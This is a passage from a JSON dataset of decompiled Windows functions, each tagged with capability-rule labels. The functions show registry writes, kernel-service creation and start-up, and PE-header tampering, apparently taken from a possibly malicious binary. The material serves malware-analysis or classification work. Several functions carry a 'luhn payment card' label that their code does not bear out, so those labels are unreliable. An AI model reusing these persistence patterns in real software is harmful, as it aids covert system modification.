        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n\nuint32_t __cdecl fcn.00403b00(uint arg_8h)\n\n{\n    uint *puVar1;\n    code *pcVar2;\n    uint uVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    uint in_ECX;\n    uint32_t uVar6;\n    ushort in_SS;\n    bool in_CF;\n    bool in_PF;\n    \n    if ((!in_PF) && (in_PF)) {\n        puVar1 = segment(in_SS, *0x10 + -4);\n        uVar3 = *puVar1;\n        uVar6 = &stack0xfffffffc & 0xffff0000 | *0x10 & 0xffff;\n        if (in_CF) {\n            *(uVar6 - 4) = 4;\n            *(uVar6 - 8) = uVar6 + 4;\n            *(uVar6 - 0xc) = 4;\n            *(uVar6 - 0x10) = 0x410780;\n            *(uVar6 - 0x14) = 0x41073c;\n            *(uVar6 - 0x18) = 0x80000002;\n            pcVar2 = _sym.imp.SHLWAPI.dll_SHSetValueA;\n            *(uVar6 - 0x1c) = 0x403b6e;\n            iVar5 = (*pcVar2)();\n            return iVar5 == 0;\n        }\n        if (in_PF) {\n            *(uVar6 + 4) = 0x30;\n            *(uVar6 + 8) = 3;\n            *(uVar6 + 0xc) = fcn.00402ca0;\n            *(uVar6 + 0x10) = uVar3;\n            *(uVar6 + 0x14) = uVar3;\n            *(uVar6 + 0x18) = in_ECX;\n            *(uVar6 + 0x1c) = uVar3;\n            *(uVar6 + 0x20) = uVar3;\n            *(uVar6 + 0x24) = uVar3;\n            *(uVar6 + 0x28) = uVar3;\n            *(uVar6 + 0x2c) = 0x410544;\n            *(uVar6 + 0x30) = uVar3;\n            pcVar2 = _sym.imp.USER32.dll_RegisterClassExA;\n            *(uVar6 - 4) = 0x403af4;\n            uVar4 = (*pcVar2)();\n            return uVar4;\n        }\n    }\n    uVar4 = (*_sym.imp.KERNEL32.dll_CreateFileA)(arg_8h, 0xc0000000, 1, 0, 3, 0x80, 0);\n    return uVar4;\n}\n",
        "token_count": 634
    },
    "00403fe0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Removing unreachable block (ram,0x00404002)\n// WARNING: Removing unreachable block (ram,0x00404010)\n// WARNING: Removing unreachable block (ram,0x00404012)\n// WARNING: Removing unreachable block (ram,0x00403fcc)\n\nvoid __cdecl\nfcn.00403fe0(uint *noname_0, uint *noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint noname_14, uint noname_15, uint noname_16, uint noname_17, uint noname_18, uint noname_19, \n            uint noname_20, uint noname_21, uint noname_22, uint noname_23, uint noname_24, uint noname_25, \n            uint noname_26, uint noname_27, uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    ushort extraout_DX;\n    uchar *unaff_ESI;\n    uint *puVar2;\n    bool bVar3;\n    uint var_67h;\n    uint var_3dh;\n    uint var_4h;\n    uchar var_68h_2;\n    uint var_67h_2;\n    uint var_4h_2;\n    \n    bVar3 = true;\n    var_4h_2 = 0;\n    var_68h_2 = 0;\n    puVar2 = &var_67h_2;\n    for (iVar1 = 0x18; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    fcn.00403e20(&var_68h_2, &var_4h_2);\n    if ((!bVar3) && (bVar3)) {\n        out(*unaff_ESI, extraout_DX);\n    }\n    fcn.00404080(&var_68h_2, var_4h_2, 0x410a54, 0x10000);\n    *noname_0 = 0x410a54;\n    *noname_1 = 0x10000;\n    return;\n}\n",
        "token_count": 585
    },
    "00404110": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nchar * __cdecl fcn.00404110(char *arg_8h, int32_t arg_ch, char *arg_10h, int32_t arg_14h)\n\n{\n    char *pcVar1;\n    int32_t iVar2;\n    char *pcVar3;\n    char *pcVar4;\n    bool bVar5;\n    \n    pcVar1 = arg_8h + (arg_ch - arg_14h);\n    if (arg_14h != 0) {\n        if (arg_8h <= pcVar1) {\n            do {\n                if (*arg_8h == *arg_10h) {\n                    bVar5 = true;\n                    iVar2 = arg_14h;\n                    pcVar3 = arg_8h;\n                    pcVar4 = arg_10h;\n                    do {\n                        pcVar4 = pcVar4 + 1;\n                        pcVar3 = pcVar3 + 1;\n                        iVar2 = iVar2 + -1;\n                        if (iVar2 == 0) break;\n                        bVar5 = *pcVar3 == *pcVar4;\n                    } while (bVar5);\n                    if (bVar5) {\n                        return arg_8h;\n                    }\n                }\n                arg_8h = arg_8h + 1;\n            } while (arg_8h <= pcVar1);\n        }\n        arg_8h = NULL;\n    }\n    return arg_8h;\n}\n",
        "token_count": 325
    },
    "null": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nuint __cdecl main(uint argv)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    code *pcVar3;\n    int16_t iVar4;\n    int32_t iVar5;\n    uint lpMsg;\n    \n    iVar4 = fcn.00403aa0(argv);\n    if ((iVar4 != 0) && (iVar5 = fcn.00403dc0(argv),  pcVar3 = _sym.imp.USER32.dll_GetMessageA,  iVar5 != 0)) {\n        iVar5 = (*_sym.imp.USER32.dll_GetMessageA)(&lpMsg, 0, 0, 0);\n        pcVar2 = _sym.imp.USER32.dll_TranslateMessage;\n        pcVar1 = _sym.imp.USER32.dll_GetDesktopWindow;\n        while (iVar5 != 0) {\n            (*pcVar2)(&lpMsg);\n            (*pcVar1)();\n            (*_sym.imp.USER32.dll_DispatchMessageA)(&lpMsg);\n            iVar5 = (*pcVar3)(&lpMsg, 0, 0, 0);\n        }\n    }\n    return 0;\n}\n",
        "token_count": 242
    },
    "00404250": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404267) overlaps instruction at (ram,0x00404265)\n// \n\nbool fcn.00404250(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint *unaff_EBX;\n    char *pcVar4;\n    char in_SF;\n    char in_OF;\n    char *var_4h;\n    \n    var_4h = NULL;\n    if ((in_OF != in_SF) || (in_OF == in_SF)) {\n        unaff_EBX = &var_4h;\n    }\n    iVar2 = fcn.00401000(unaff_EBX);\n    if (iVar2 == 0) {\n        return false;\n    }\n    if (var_4h == NULL) {\n        return false;\n    }\n    uVar3 = 0xffffffff;\n    pcVar4 = var_4h;\n    do {\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        cVar1 = *pcVar4;\n        pcVar4 = pcVar4 + 1;\n    } while (cVar1 != '\\0');\n    iVar2 = (*_sym.imp.SHLWAPI.dll_SHSetValueA)(0x80000002, 0x41073c, 0x41077c, 1, var_4h, ~uVar3 - 1);\n    return iVar2 == 0;\n}\n",
        "token_count": 323
    },
    "00404680": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "get common file path"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_20fh\n\nuint __cdecl fcn.00404680(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint unaff_EBX;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    uint *puVar2;\n    uchar *noname_2;\n    uint noname_3;\n    uchar lpBuffer;\n    uint var_20fh;\n    uint in_stack_fffffdf4;\n    uint in_stack_fffffdf8;\n    uint in_stack_fffffdfc;\n    uint in_stack_fffffe00;\n    uint in_stack_fffffe04;\n    uint in_stack_fffffe08;\n    uint in_stack_fffffe0c;\n    uint in_stack_fffffe10;\n    uint in_stack_fffffe14;\n    uint in_stack_fffffe18;\n    uint in_stack_fffffe1c;\n    uint in_stack_fffffe20;\n    uint in_stack_fffffe24;\n    uint in_stack_fffffe28;\n    uint in_stack_fffffe2c;\n    uint in_stack_fffffe30;\n    uint in_stack_fffffe34;\n    uint in_stack_fffffe38;\n    uint in_stack_fffffe3c;\n    uint in_stack_fffffe40;\n    uint in_stack_fffffe44;\n    uchar s;\n    uint var_10bh;\n    uint var_8h;\n    uint var_4h;\n    \n    _lpBuffer = _lpBuffer & 0xffffff00;\n    puVar2 = &var_20fh;\n    for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    s = 0;\n    puVar2 = &var_10bh;\n    for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    noname_2 = &lpBuffer;\n    noname_3 = 0x104;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)();\n    (*_sym.imp.MSVCRT.dll_sprintf)(&s, 0x41055c, &lpBuffer, arg_8h);\n    fcn.00403fe0(&var_4h, &var_8h, noname_2, noname_3, unaff_EDI, unaff_ESI, unaff_EBX, _lpBuffer, stack0xfffffdf0, \n                 in_stack_fffffdf4, in_stack_fffffdf8, in_stack_fffffdfc, in_stack_fffffe00, in_stack_fffffe04, \n                 in_stack_fffffe08, in_stack_fffffe0c, in_stack_fffffe10, in_stack_fffffe14, in_stack_fffffe18, \n                 in_stack_fffffe1c, in_stack_fffffe20, in_stack_fffffe24, in_stack_fffffe28, in_stack_fffffe2c, \n                 in_stack_fffffe30, in_stack_fffffe34, in_stack_fffffe38, in_stack_fffffe3c, in_stack_fffffe40, \n                 in_stack_fffffe44);\n    fcn.004047c0(var_4h);\n    iVar1 = fcn.004017b0(&s, 0x41057c, var_4h, var_8h);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    fcn.00402ac0(&s, 0xffffffff);\n    return 1;\n}\n",
        "token_count": 865
    },
    "004047c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040481f) overlaps instruction at (ram,0x0040481e)\n// \n// WARNING: Removing unreachable block (ram,0x00404878)\n\nint16_t * __cdecl fcn.004047c0(int16_t *arg_8h)\n\n{\n    char *pcVar1;\n    uint8_t *puVar2;\n    char cVar3;\n    uint8_t uVar4;\n    int32_t *piVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    char extraout_CL;\n    int32_t in_ECX;\n    uint32_t uVar8;\n    uint in_EDX;\n    int32_t *unaff_EBX;\n    int16_t *unaff_ESI;\n    int16_t *piVar9;\n    int16_t *piVar10;\n    uint8_t *puVar11;\n    uint8_t *puVar12;\n    int32_t unaff_EDI;\n    int32_t *piVar13;\n    int32_t in_FS_OFFSET;\n    uint8_t in_AF;\n    bool in_ZF;\n    bool bVar14;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    uint var_4h;\n    \n    if ((!in_ZF) && (in_ZF)) {\n        out(*unaff_ESI, in_EDX);\n    }\n    bVar14 = *arg_8h != 0x5a4d;\n    if (bVar14) {\n        return NULL;\n    }\n    piVar10 = arg_8h;\n    if ((bVar14) && (!bVar14)) {\n        piVar10 = arg_8h + 1;\n        out(*arg_8h, in_EDX);\n    }\n    piVar5 = *(piVar10 + 0x1e) + piVar10;\n    if (((-1 < piVar5) && (piVar9 = piVar10,  -1 >= piVar5)) || (piVar9 = unaff_ESI,  *piVar5 != 0x4550)) {\n        *unaff_EBX = *unaff_EBX & 0xc3;\n        pcVar1 = in_ECX * 2 + 0x33;\n        *pcVar1 = *pcVar1 + (in_EDX >> 8);\n        *(unaff_EDI + 0x5e) = *(unaff_EDI + 0x5e);\n        return piVar9;\n    }\n    if ((!SBORROW4(*piVar5, 0x4550)) && (SBORROW4(*piVar5, 0x4550))) {\n        LOCK();\n        piVar10 = 0x138b2633;\n        piVar5 = piVar5 + 0x658f517f;\n    }\n    if (piVar5[0x16] != 0) {\n        return NULL;\n    }\n    if (*(piVar10 + 0x1e) < 0x81) {\n        return NULL;\n    }\n    uVar8 = *(piVar10 + 0x1e);\n    if (uVar8 < 0xc0) {\n        puVar11 = uVar8 - 0x80;\n    }\n    else {\n        puVar11 = 0x40;\n        if (uVar8 < 0xc0) goto code_r0x004048c2;\n    }\n    piVar5 = func_0x00404c3c(puVar11);\n    unaff_EBX = piVar5;\ncode_r0x004048c2:\n    puVar2 = puVar11 + 1;\n    uVar4 = piVar5;\n    cVar3 = uVar4 - *puVar11;\n    iVar6 = func_0x1018a844((in_NT & 1) * 0x4000 | SBORROW1(uVar4, *puVar11) * 0x800 | (in_IF & 1) * 0x200 |\n                            (in_TF & 1) * 0x100 | (cVar3 < '\\0') * 0x80 | (cVar3 == '\\0') * 0x40 | (in_AF & 1) * 0x10 |\n                            ((POPCOUNT(cVar3) & 1U) == 0) * 4 | uVar4 < *puVar11 | (in_ID & 1) * 0x200000 |\n                            (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 0x80000 | (in_AC & 1) * 0x40000);\n    iVar7 = *(in_FS_OFFSET + iVar6);\n    *(unaff_EBX + 0x13120f6) = *(unaff_EBX + 0x13120f6) + extraout_CL;\n    if (unaff_EBX == NULL) {\n        return iVar6 + iVar7;\n    }\n    puVar11 = NULL;\n    if (puVar2 != NULL) {\n        do {\n            iVar7 = (*_sym.imp.MSVCRT.dll_rand)();\n            puVar12 = puVar11 + 1;\n            puVar11[unaff_EBX] = iVar7 % 0xff;\n            puVar11 = puVar12;\n        } while (puVar12 < puVar2);\n    }\n    piVar5 = unaff_EBX;\n    piVar13 = arg_8h + 0x40;\n    for (uVar8 = puVar2 >> 2; uVar8 != 0; uVar8 = uVar8 - 1) {\n        *piVar13 = *piVar5;\n        piVar5 = piVar5 + 1;\n        piVar13 = piVar13 + 1;\n    }\n    for (uVar8 = puVar2 & 3; uVar8 != 0; uVar8 = uVar8 - 1) {\n        *piVar13 = *piVar5;\n        piVar5 = piVar5 + 1;\n        piVar13 = piVar13 + 1;\n    }\n    sub.MSVCRT.dll_void___cdecl_operator_delete_void__(unaff_EBX);\n    return 0x1;\n}\n",
        "token_count": 1410
    },
    "00404b40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "set registry value",
            "delete registry key"
        ],
        "decompiled_code": "\nvoid fcn.00404b40(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint uStack332;\n    uint uStack328;\n    uint uStack324;\n    uint uStack320;\n    uint uStack316;\n    uint uStack312;\n    uint uStack308;\n    uint uStack304;\n    uchar *puStack300;\n    uchar *puStack296;\n    uchar uStack276;\n    uint uStack275;\n    uint uStack271;\n    uint uStack267;\n    ushort uStack263;\n    uchar uStack261;\n    uchar uStack260;\n    uint uStack259;\n    \n    uStack275 = 0;\n    uStack271 = 0;\n    uStack267 = 0;\n    uStack276 = 0;\n    uStack263 = 0;\n    uStack260 = 0;\n    uStack261 = 0;\n    puVar4 = &stack0xfffffefd;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    *puVar4 = 0;\n    *(puVar4 + 2) = 0;\n    fcn.004026a0();\n    puStack296 = 0x404b8a;\n    fcn.00402a60(&stack0xfffffeec, 5);\n    pcVar1 = _sym.imp.MSVCRT.dll_sprintf;\n    puStack296 = &stack0xfffffefc;\n    puStack300 = 0x404ba4;\n    (*_sym.imp.MSVCRT.dll_sprintf)();\n    puStack296 = 0x404bb7;\n    (*_sym.imp.SHLWAPI.dll_SHDeleteKeyA)();\n    pcVar2 = _sym.imp.SHLWAPI.dll_SHSetValueA;\n    puStack300 = &stack0xfffffee4;\n    puStack296 = 0x10;\n    uStack304 = 1;\n    uStack308 = 0x420a80;\n    uStack312 = 0x4108a0;\n    uStack316 = 0x80000000;\n    uStack320 = 0x404bd7;\n    (*_sym.imp.SHLWAPI.dll_SHSetValueA)();\n    uStack320 = 0x4b;\n    uStack324 = 0x4108d4;\n    uStack328 = 1;\n    uStack332 = 0x420a80;\n    (*pcVar2)(0x80000000, &stack0xfffffedc);\n    (*pcVar1)(&stack0xfffffec4, 0x410920, &stack0xfffffeb4);\n    (*pcVar2)(0x80000000, &stack0xfffffec4, 0x41095c, 1, 0x410964, 0x14);\n    return;\n}\n",
        "token_count": 654
    },
    "00403b50": {
        "rules": [
            "set registry value"
        ],
        "decompiled_code": "\nbool fcn.00403b50(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.SHLWAPI.dll_SHSetValueA)(0x80000002, 0x41073c, 0x410780, 4, &stack0x00000004, 4);\n    return iVar1 == 0;\n}\n",
        "token_count": 79
    },
    "00402c00": {
        "rules": [
            "get service handle",
            "start service"
        ],
        "decompiled_code": "\nuint64_t __cdecl fcn.00402c00(uint hSCManager, uint lpServiceName)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t extraout_EDX;\n    uint extraout_EDX_00;\n    uint *unaff_EDI;\n    bool in_OF;\n    uint64_t uVar4;\n    uint in_stack_00000010;\n    \n    if ((!in_OF) && (in_OF)) {\n        *unaff_EDI = in_stack_00000010;\n        return CONCAT44(lpServiceName, in_stack_00000010);\n    }\n    uVar4 = (*_sym.imp.ADVAPI32.dll_OpenServiceA)(hSCManager, lpServiceName, 0xf01ff);\n    iVar2 = uVar4;\n    if (iVar2 == 0) {\n        return uVar4 & 0xffffffff00000000;\n    }\n    iVar3 = (*_sym.imp.ADVAPI32.dll_StartServiceA)(uVar4, 0, 0);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetLastError;\n    if (iVar3 == 0) {\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if (iVar3 != 0x420) {\n            iVar3 = (*pcVar1)();\n            if (iVar3 != 0x422) {\n                (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar2);\n                return extraout_EDX << 0x20;\n            }\n        }\n    }\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar2);\n    return CONCAT44(extraout_EDX_00, 1);\n}\n",
        "token_count": 369
    },
    "00402d90": {
        "rules": [
            "get service handle",
            "create service"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402d90(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    bool bVar2;\n    \n    iVar1 = (*_sym.imp.ADVAPI32.dll_CreateServiceA)(arg_8h, arg_ch, arg_ch, 0xf01ff, 1, 0, 1, arg_10h, 0, 0, 0, 0, 0);\n    bVar2 = iVar1 == 0;\n    if (bVar2) {\n        return 0;\n    }\n    if ((!bVar2) && (bVar2)) {\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar1);\n    return 1;\n}\n",
        "token_count": 190
    }
}